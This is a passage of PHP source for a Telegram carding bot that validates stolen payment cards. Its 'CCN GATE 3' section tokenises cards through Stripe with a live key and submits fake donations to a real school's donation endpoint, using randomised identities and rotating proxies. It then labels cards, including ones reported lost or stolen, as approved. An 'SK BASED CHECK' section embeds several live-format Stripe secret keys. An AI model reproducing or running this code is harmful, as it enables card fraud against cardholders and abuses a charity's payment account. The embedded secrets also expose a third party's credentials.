sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b> 『 ★ CVV MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}

////////////////////////////////////////////////////// CCN GATE 3 ///////////////////////////////////////////////////////////////////

if ((strpos($message, "!cc3") === 0)||(strpos($message, "/cc3") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details 

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Proxys]===//////////////

$rp1 = array(
  1 => 'user-rotate:pass',
  2 => 'user-rotate:pass',
  3 => 'user-rotate:pass',
  4 => 'user-rotate:pass',
  5 => 'user-rotate:pass',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

////////////////////////////////////////////

////////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy Live!";
}
if (empty($ip1)){
$ip = "Proxy Live!";
}

//echo '[ IP: '.$ip.' ] ';
 
 /////////////////////////////// 1st REQ /////////////////////////////////////////////

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e26d77bc-f543-4d8e-bf09-22bfdddc07e406905e&muid=e9973314-caf5-4e0b-a841-9feee96ccd35fbc086&sid=230e29eb-8f15-499e-8d62-2f38115b8a0ec6ad3a&pasted_fields=number&payment_user_agent=stripe.js%2Fb6b83d5a%3B+stripe-js-v3%2Fb6b83d5a&time_on_page=99982&referrer=https%3A%2F%2Famherstmontessori.org%2F&key=pk_live_R889CnMM9EShOTyJsVDuHkcY00I7wQOpKU');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# --------------- [2nd Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://amherstmontessori.org/?ACT=44');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: amherstmontessori.org',
'method: POST',
'path: /?ACT=44',
'scheme: https',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6,fr;q=0.5,pt;q=0.4',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: exp_last_visit=1295511281; exp_tracker=%7B%220%22%3A%22support%2Fdonate%22%2C%22token%22%3A%22fd5188dcbdcbb03eec432dfeb275f80351a6b4ef4447cf11c1da337f5d1bf346fbb2d0972116b076e00150da24f2d428%22%7D; exp_csrf_token=1ae8bba97ecb76a3e4cd3a440a1c549d9db1f824; _ga=GA1.2.1567773826.1610871286; _gid=GA1.2.2121053797.1610871286; __stripe_mid=e9973314-caf5-4e0b-a841-9feee96ccd35fbc086; __stripe_sid=230e29eb-8f15-499e-8d62-2f38115b8a0ec6ad3a; exp_last_activity=1610871388; exp_flash=%7B%22%3Anew%3Acharge_stripe_error%22%3Atrue%2C%22%3Anew%3Acharge_stripe_error_message%22%3A%22Your+card+was+declined.%22%7D6b759a4d68a02e8f39babb9253d28557ea37c9f6f7a7a142fbbcb47a26593c845258b1df821c54454ac4f8acdc17e114',
'origin: https://amherstmontessori.org',
'referer: https://amherstmontessori.org/support/donate',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.40 Safari/537.36 Edg/87.0.664.24',
'x-requested-with: XMLHttpRequest',
));
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'XID=1ae8bba97ecb76a3e4cd3a440a1c549d9db1f824&ret=%252Fcharge%252Fdonation-thank-you&ret_error=https%253A%252F%252Famherstmontessori.org%252Fsupport%252Fdonate&P=ofvMCyUkkeksU3cdXqHgG%2Bisc7WmiJ3LbWHhf%2BYU7i2uEiKAMHgR7XzF%2BEE5wAMG7rV0JSVlrugQ0MUdLz2IYqt2UIjzcAxzI2GB2kFcghQNq8T6te8ysMKMDnHzRfpE938wXeMTze4e44cLQf25OTf1bNePh7pkUPKd1hwW0YzLajJT%2BEeOWbavQZq7%2FR3pHySNNY2v2MW4GXAD5XYWc4uhgjmIU3erqAjqXA0%2FZ6h0JprKVJ4K8z31bUtJutAvfI0LUzGkHLDGIGiQ7MCOy5yOTrOXM2tMRpnJobA3XQ1gX3wBE%2FWRaNnNAW4sYD3A&customer_name=Lund+Lele&meta%3Aaddress=Loda&meta%3Acity=Berkeley&meta%3Astate=CA&meta%3Azip=94701&meta%3Aphone=8888888888&customer_email='.$email.'&meta%3Atypeofdonation=annual+fund&plan_amount=100&plan_interval_count=0&meta%3Adedication=&meta%3Aanonymous=Yes&meta%3Aaffiliation=current+parent&meta%3Acomment=saa&card_token='.$id.'');

$result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b> 『 ★ CVV MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}

//////////////////////////////////////////////////// SK BASED CHECK ////////////////////////////////////////

elseif (strpos($message, "/cvv") === 0){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon   = $i[1];
$year  = $i[2];
$year1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mon = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

$skeys = array(
//1 => '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',
//2 => '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',
//3 => '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',
//4 => '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',
5 => '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',
6 => 'sk_live_h1Q2bZXi5xREBSEhmrUFf31i00IE0Rtpil',
);
$skey = array_rand($skeys);
$sk = $skeys[$skey];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
